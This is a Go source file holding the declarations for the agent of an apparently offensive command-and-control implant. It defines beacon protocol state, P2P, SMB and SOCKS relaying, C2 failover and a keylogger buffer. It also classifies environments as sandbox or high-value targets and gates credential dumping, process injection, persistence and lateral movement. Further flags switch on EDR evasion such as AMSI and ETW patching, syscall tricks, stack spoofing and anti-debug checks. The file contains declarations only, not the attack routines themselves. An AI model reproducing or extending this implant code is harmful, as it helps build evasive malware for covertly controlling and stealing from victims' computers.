//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// Shared protocol types.
type BeaconRequest = protocol.BeaconRequest
type BeaconResponse = protocol.BeaconResponse
type TaskResult = protocol.TaskResult
type Task = protocol.Task
type RelayedData = protocol.RelayedData
type RelayedTask = protocol.RelayedTask
type socksFrame = protocol.SocksFrame

// CurrentProtocolVersion mirrors the server's supported protocol version.
const CurrentProtocolVersion = protocol.CurrentProtocolVersion

// agentFrameKind classifies the envelope the agent builds for a beacon.
type agentFrameKind int

const (
	agentFrameRegister  agentFrameKind = iota // one-time v2 registration with the identity key
	agentFrameHandshake                       // authenticated ECDH handshake (rekey / restart recovery)
	agentFrameEncrypted                       // ciphertext frame with an established session
)

var (
	client          *http.Client
	agentUUID       string
	rng             = newCryptoRand()
	pendingMu       sync.Mutex
	pendingResults  []TaskResult
	pendingTaskAcks []uint
	taskQueue       = make(chan Task, 32)
	taskWorkerOnce  sync.Once
	beaconWake      = make(chan struct{}, 1)
	screenStreaming int32 // atomic: 0=false, 1=true
	inFastMode      atomic.Bool
	useCLRHosting   bool

	// v2 beacon protocol state
	agentRegKey    []byte     // per-agent registration key derived from the beacon key (nil = not usable)
	beaconSeq      uint64     // monotonic per-agent frame sequence (persisted; never goes backwards)
	registered     bool       // identity key bound on the server (persisted marker)
	rekeyRequested bool       // server asked for a fresh session key (honoured next beacon)
	seqMu          sync.Mutex // guards beaconSeq/registered/rekeyRequested

	// Beacon failure tracking for exponential backoff
	beaconConsecutiveFailures int

	// P2P relay state
	p2pRelayRunning  bool
	p2pRelayMu       sync.Mutex
	p2pChildUUIDs    []string // UUIDs of children connected through us
	p2pChildResults  = make(map[string][]TaskResult)
	p2pChildAcks     = make(map[string][]uint)
	p2pChildTasks    = make(map[string][]Task)
	p2pChildLastSeen = make(map[string]time.Time)

	// SMB transport state
	isSMBChild bool // true if this agent is connected via SMB to a parent

	// Keylogger state (cross platform, inc in platform files)
	keylogActive int32 // atomic: 0=false, 1=true
	keylogMu     sync.Mutex
	keylogBuffer bytes.Buffer
)

// ── SOCKS Relay State (agent side) ───────────────────────────────────────────

type socksRelayConn struct {
	tcpConn  net.Conn
	mu       sync.Mutex
	outbound []socksFrame // buffered frames agent→server
	closed   bool
}

// udpRelayConn holds state for a UDP ASSOCIATE relay on the agent side.
// A single UDP socket is shared for all datagrams within the association.
type udpRelayConn struct {
	connID  uint64
	udpConn *net.UDPConn
	mu      sync.Mutex
	closed  bool
}

const (
	socksOrphanMaxOut = 128             // max orphan control frames to prevent memory leak
	SocksReadTimeout  = 5 * time.Minute // read timeout on target connections
)

var (
	socksRelayMu    sync.Mutex
	socksRelayConns = make(map[uint64]*socksRelayConn)
	socksRelayFast  bool // fast-poll when any SOCKS relay is active

	udpRelayMu    sync.Mutex
	udpRelayConns = make(map[uint64]*udpRelayConn)
)

// ── C2 Mode (Multi-C2 Traffic Splitting and Failover) ───────────────────

type C2Mode int

const (
	C2ModeSingle C2Mode = iota
	C2ModeFailover
	C2ModeRoundRobin
	C2ModeRandom
	C2ModeSplit
	C2ModeParallel
)

type c2FailStats struct {
	failures    int
	lastFailure time.Time
	consecutive int
}

var (
	c2Mode        C2Mode
	c2Stats       map[int]*c2FailStats
	c2StatsMu     sync.Mutex
	deadMode      int32 // atomic bool
	deadModeStart time.Time
)

// ── Environment Classification ──────────────────────────────────────────

type EnvClass int

const (
	EnvUnknown   EnvClass = 0
	EnvSandbox   EnvClass = 1
	EnvHome      EnvClass = 2
	EnvCorporate EnvClass = 3
	EnvServer    EnvClass = 4
	EnvHighValue EnvClass = 5
)

func (e EnvClass) String() string {
	switch e {
	case EnvSandbox:
		return "sandbox"
	case EnvHome:
		return "home"
	case EnvCorporate:
		return "corporate"
	case EnvServer:
		return "server"
	case EnvHighValue:
		return "high_value"
	default:
		return "unknown"
	}
}

type OpsProfile struct {
	Class              EnvClass
	ClassLabel         string
	AllowShell         bool
	AllowInjection     bool
	AllowCredDump      bool
	AllowPersistence   bool
	AllowLateral       bool
	AllowKeylogger     bool
	AllowScreenCapture bool
	AllowTokenOps      bool
	MaxBeaconJitter    int
	MinBeaconInterval  int
	OfficeHoursOnly    bool
}

var (
	currentEnvClass   string
	currentOpsProfile *OpsProfile
	envDetected       bool
)

func isShellTask(taskType string) bool {
	return taskType == "shell" || taskType == "ps" || taskType == "powerpick"
}

func isInjectTask(taskType string) bool {
	return taskType == "inject" || taskType == "shinject" || taskType == "spawn" || taskType == "shspawn" || taskType == "migrate" || taskType == "peloader" || taskType == "bof"
}

// ── Egress Detection State ───────────────────────────────────────────────
var (
	egressReport    *EgressReport
	egressDetected  bool
	bestEgressProto string
)

// ── EDR Adaptive Strategy Flags ───────────────────────────────────────────
// Set by ApplyStrategy() at startup based on detected EDR.
var (
	useIndirectSyscall bool
	useStackSpoofing   bool
	pebBlockDLLs       bool
	patchAMSI          bool
	patchETW           bool
	enableSleepMask    bool
	enableVEHUnhook    bool
)

// ── Anti-Debug State ─────────────────────────────────────────────────────
var (
	antiDebugScore     int32 // current anti-debug score (0-100)
	antiDebugTriggered bool  // true if any debugger detected
)

// ── P2P Gossip State ─────────────────────────────────────────────────────
var (
	GossipEnabled  bool
	GossipInterval int
)
